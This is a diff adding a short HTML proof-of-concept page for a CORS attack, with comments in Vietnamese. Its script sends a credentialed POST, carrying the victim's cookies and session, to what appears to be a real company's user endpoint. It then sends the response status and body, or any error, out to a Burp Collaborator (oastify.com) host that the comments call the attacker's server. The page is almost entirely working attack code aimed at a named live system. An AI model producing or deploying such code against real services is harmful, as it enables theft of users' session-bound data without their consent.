@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<h1>PUT JSON CORS PoC</h1>
+<script>
+(async () => {
+  const target = "https://uapami.huuhong.com.vn:6805/uap/user/MDC-005-001-Template_Management/favoritemenus"; // đổi endpoint thực tế
+  const payload = {
+    "type": "1"
+  };
+
+  try {
+    const r = await fetch(target, {
+      method: "POST",
+      credentials: "include",                 // gửi cookie/session của nạn nhân
+      headers: {
+        "Content-Type": "application/json"    // sẽ gây preflight
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const text = await r.text();              // nếu CORS cho đọc response
+    // Exfiltrate status + body về Burp Collaborator/attacker
+    await fetch("https://ddul6qkqsz5s9vq5j25pppt2ctik6b7zw.oastify.com/log?st=" + r.status + "&d=" + encodeURIComponent(text));
+  } catch (e) {
+    // log lỗi về server attacker để bạn xem
+    await fetch("https://ddul6qkqsz5s9vq5j25pppt2ctik6b7zw.oastify.com/log?err=" + encodeURIComponent(String(e)));
+  }
+})();
+</script>
